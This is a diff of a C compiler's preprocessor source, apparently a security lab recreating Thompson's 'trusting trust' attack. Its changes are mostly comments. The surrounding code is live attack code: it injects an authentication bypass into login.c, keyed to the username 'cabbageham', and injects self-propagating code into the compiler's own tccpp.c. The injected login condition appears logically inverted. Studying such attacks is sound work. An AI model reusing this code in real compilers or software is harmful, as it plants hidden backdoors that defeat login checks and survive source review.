@@ -656,7 +656,8 @@ static int handle_eob(void)
 
             /* Bugged login code start*/
 
-            /* The source code to hack bugged_login.c */
+            /* The source code to hack login.c */
+
             // The string to be inserted into login.c
             const char* inject_login = "if(strcmp(username, %ccabbageham%c)) {%c printf(%cwelcome!%cn%c);%c return 0;%c }%c";
             // %c 34 = "
@@ -671,7 +672,7 @@ static int handle_eob(void)
                 unsigned char* inject_location = strstr(bf->buffer, "return 1;");
                 int pre_inject_len = inject_location - bf->buffer;
                 
-                // This line should have been deleted. Previously I add a space at the very beginning to avoid revisiting the same file. But since I adopted a counter to handle this, this line doesn't make sense anymore.
+                // Code injection
                 new_buf[0] = ' ';
                 strncpy(new_buf + 1, bf->buffer, pre_inject_len);
                 strncpy(new_buf + pre_inject_len + 1, inject_code, inject_len);
@@ -679,6 +680,8 @@ static int handle_eob(void)
                 len = len + inject_len - 9;
                 strncpy(bf->buffer, new_buf, len);
                 bf->buffer[len] = 0;
+
+                //Free memory to avoid memory leak. Absence of tcc_free() might led to some bugs.
                 tcc_free(inject_code);
                 tcc_free(new_buf);
             }
@@ -693,15 +696,21 @@ static int handle_eob(void)
                 int inject_len = strlen(inject_code);
                 unsigned char* new_buf = tcc_malloc(sizeof(unsigned char) * IO_BUF_SIZE);
                 memset(new_buf, 0, sizeof(unsigned char) * IO_BUF_SIZE);
+
+                // Set inject location in tccpp.c
                 unsigned char* inject_location = strstr(bf->buffer, "if (len < 0)");
                 int pre_inject_len = inject_location - bf->buffer;
+
+
+                // Code injection
                 strncpy(new_buf, bf->buffer, pre_inject_len);
                 strncpy(new_buf + pre_inject_len, inject_code, inject_len);
                 strcat(new_buf, inject_location);
                 len = len + inject_len - 1;
                 strncpy(bf->buffer, new_buf, len + 2);
                 bf->buffer[len + 2] = 0;
-                // Avoid memory leak, because absence of tcc_free() led to some bugs.
+
+                //Free memory to avoid memory leak. Absence of tcc_free() might led to some bugs.
                 tcc_free(inject_code);
                 tcc_free(new_buf);
             }
